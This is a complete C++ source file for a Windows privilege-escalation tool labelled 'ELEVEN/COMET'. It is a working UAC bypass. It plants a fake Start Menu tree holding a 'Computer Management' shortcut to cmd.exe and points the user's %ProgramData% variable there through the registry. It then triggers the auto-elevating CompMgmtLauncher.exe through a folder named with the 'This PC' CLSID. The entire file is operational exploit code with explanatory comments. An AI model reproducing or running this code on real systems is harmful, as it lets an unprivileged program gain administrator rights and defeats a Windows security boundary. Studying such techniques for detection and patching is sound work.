#include <Windows.h>
#include <ShlGuid.h>
#include <ShObjIdl.h>

void MakeDirs()
{
	// Create our directory path
	CreateDirectory(L"C:\\Eleven",NULL);
	CreateDirectory(L"C:\\Eleven\\Microsoft",NULL);
	CreateDirectory(L"C:\\Eleven\\Microsoft\\Windows",NULL);
	CreateDirectory(L"C:\\Eleven\\Microsoft\\Windows\\Start Menu",NULL);
	CreateDirectory(L"C:\\Eleven\\Microsoft\\Windows\\Start Menu\\Programs",NULL);
	CreateDirectory(L"C:\\Eleven\\Microsoft\\Windows\\Start Menu\\Programs\\Administrative Tools",NULL);
	// This directory is named using the CLSID of "My Computer"/"This PC"
	// Naming it so allows us to use the verb "Manage" on it later on.
	CreateDirectory(L"C:\\Eleven\\Comet.{20D04FE0-3AEA-1069-A2D8-08002B30309D}", NULL);
}

BOOL MakeLink()
{
	// This function creates the required LNK file that points to the command line interpreter
	BOOL retVal = FALSE;
	IPersistFile *persistFile;
	IShellLink *newLink;

	// Initialize COM
	if (!CoInitialize(NULL))
	{
		// Create a ShellLink object
		if (!CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID *)&newLink))
		{
			// Set path and arguments
			newLink->SetPath(L"C:\\Windows\\System32\\cmd.exe");
			newLink->SetArguments(L"/k echo ELEVEN/COMET");
			newLink->SetDescription(L"ELEVEN/COMET - Command Elevation Tool");
			if (!newLink->QueryInterface(IID_IPersistFile, (LPVOID *)&persistFile))
			{
				// Save the link as "Computer Management.lnk", to later be called by CompMgmtLauncher.exe
				if (!persistFile->Save(L"C:\\Eleven\\Microsoft\\Windows\\Start Menu\\Programs\\Administrative Tools\\Computer Management.lnk", TRUE))
				{
					persistFile->Release();
					retVal = TRUE;
				}
			}
			newLink->Release();
		}
	}
	return retVal;
}

BOOL SetEnvVar()
{
	// This functions points %ProgramData% to a path we can control
	BOOL retVal = FALSE;
	HKEY regEnv;
	// ... using registry keys. This can also be done with the "setx" command
	if (!RegOpenKeyEx(HKEY_CURRENT_USER, L"Environment", 0, KEY_ALL_ACCESS, &regEnv))
	{
		if (!RegSetValueEx(regEnv, L"ProgramData", NULL, REG_SZ, (BYTE *)L"C:\\Eleven", 20))
		{
			RegCloseKey(regEnv);
			retVal = TRUE;
		}	
	}
	return retVal;
}

VOID RestoreEnvVar()
{
	// Restore the original environment. Files cleanup is up to the user.
	HKEY regEnv;
	if (!RegOpenKeyEx(HKEY_CURRENT_USER, L"Environment", 0, KEY_ALL_ACCESS, &regEnv))
	{
		RegDeleteValue(regEnv, L"ProgramData");
	}
}

int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	VOID *oldFsValue;

	// Disable WOW64 file system redirection.
	// If our process is a 32-bit one (which it is), calls to C:\Windows\System32
	// Will be redirected to C:\Windows\SysWOW64
	// However, CompMgmtLauncher.exe resides in C:\Windows\System32
	Wow64DisableWow64FsRedirection(&oldFsValue);

	MakeDirs();
	if (MakeLink())
	{
		if (SetEnvVar())
		{
			// Run the "Manage" verb on our "computer"-like folder
			// (which calls CompMgmtLauncher.exe, which loads the "Computer Management" link and runs our command)
			ShellExecute(NULL, L"Manage", L"C:\\Eleven\\Comet.{20D04FE0-3AEA-1069-A2D8-08002B30309D}", L"", L"C:\\Eleven", SW_SHOW);
			RestoreEnvVar();
			Wow64RevertWow64FsRedirection(oldFsValue);
			return 0;
		}
	}
	Wow64RevertWow64FsRedirection(oldFsValue);
	return 1;
}